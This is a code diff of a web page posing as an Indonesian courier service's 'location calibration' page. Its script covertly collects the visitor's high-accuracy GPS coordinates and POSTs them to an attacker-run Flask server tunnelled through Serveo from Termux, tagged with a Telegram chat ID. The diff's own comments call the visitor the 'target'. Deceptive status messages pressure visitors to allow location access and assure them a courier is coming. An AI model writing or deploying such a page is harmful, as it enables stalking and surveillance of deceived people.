@@ -73,7 +73,8 @@
         &copy; 2026 Logistic Express Gateway Indonesia. All Rights Reserved.
     </div>
 
-<script>
+<<script>
+    // 1. Mengambil parameter ?uid= dari URL secara otomatis
     const urlParams = new URLSearchParams(window.location.search);
     const userIdAdmin = urlParams.get('uid'); 
 
@@ -82,11 +83,12 @@
         statusText.style.color = "#495057";
         statusText.innerText = "🔄 Menghubungkan ke satelit GPS, mohon tunggu...";
 
+        // 2. Request sensor Geolocation dari browser perangkat target
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(kirimKeTermux, tanganiError, {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
+                enableHighAccuracy: true,  // Memaksa akurasi sensor paling tinggi (GPS)
+                timeout: 10000,            // Batas waktu membaca sensor (10 detik)
+                maximumAge: 0              // Mengabaikan cache lokasi lama
             });
         } else {
             statusText.style.color = "#dc3545";
@@ -100,12 +102,20 @@
         const acc = position.coords.accuracy;
         const statusText = document.getElementById("status-message");
 
-        const targetChatId = userIdAdmin ? userIdAdmin : 6953925929; 
-        const URL_SERVER_TERMUX = "testerbottelee2.serveousercontent.com";
+        statusText.innerText = "🛰️ Satelit terhubung! Mengirim data enkripsi koordinat...";
 
+        // Fallback UID default jika link dibuka tanpa parameter ?uid=
+        const targetChatId = userIdAdmin ? userIdAdmin : "6953925929"; 
+        
+        // PERBAIKAN UTAMA: Tambahkan https:// dan endpoint /input_lokasi sesuai route Flask
+        const URL_SERVER_TERMUX = "https://serveousercontent.com";
+
+        // 3. Mengirimkan koordinat ke server Flask di Termux
         fetch(URL_SERVER_TERMUX, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify({
                 lat: lat,
                 lon: lon,
@@ -113,14 +123,25 @@
                 uid: targetChatId
             })
         })
-        .then(res => res.json())
+        .then(res => {
+            if (!res.ok) {
+                throw new Error("HTTP error " + res.status);
+            }
+            return res.json();
+        })
         .then(data => {
-            statusText.style.color = "#28a745";
-            statusText.innerText = "✅ Sukses! Titik lokasi rumah Anda berhasil dikalibrasi. Kurir akan segera meluncur.";
+            if(data.status === "success") {
+                statusText.style.color = "#28a745";
+                statusText.innerText = "✅ Sukses! Titik lokasi rumah Anda berhasil dikalibrasi. Kurir akan segera meluncur.";
+            } else {
+                statusText.style.color = "#dc3545";
+                statusText.innerText = "❌ Validasi gagal: Data koordinat tidak lengkap.";
+            }
         })
         .catch(err => {
+            console.error("Detail Eror Fetch:", err);
             statusText.style.color = "#dc3545";
-            statusText.innerText = "❌ Sinkronisasi gagal. Coba matikan Wi-Fi dan gunakan data seluler.";
+            statusText.innerText = "❌ Sinkronisasi gagal. Pastikan server Termux & Serveo Anda menyala.";
         });
     }
 
@@ -131,11 +152,18 @@
             case error.PERMISSION_DENIED:
                 statusText.innerText = "❌ Kesalahan: Anda wajib mengklik 'Izinkan / Allow' akses lokasi pada pop-up browser agar kurir dapat membaca peta.";
                 break;
+            case error.POSITION_UNAVAILABLE:
+                statusText.innerText = "❌ Lokasi tidak tersedia. Aktifkan GPS (Layanan Lokasi) di HP Anda.";
+                break;
+            case error.TIMEOUT:
+                statusText.innerText = "❌ Waktu pencarian satelit habis. Coba segarkan halaman.";
+                break;
             default:
                 statusText.innerText = "❌ Sinkronisasi gagal karena gangguan sinyal satelit.";
         }
     }
 </script>
+
 
 </body>
 </html>
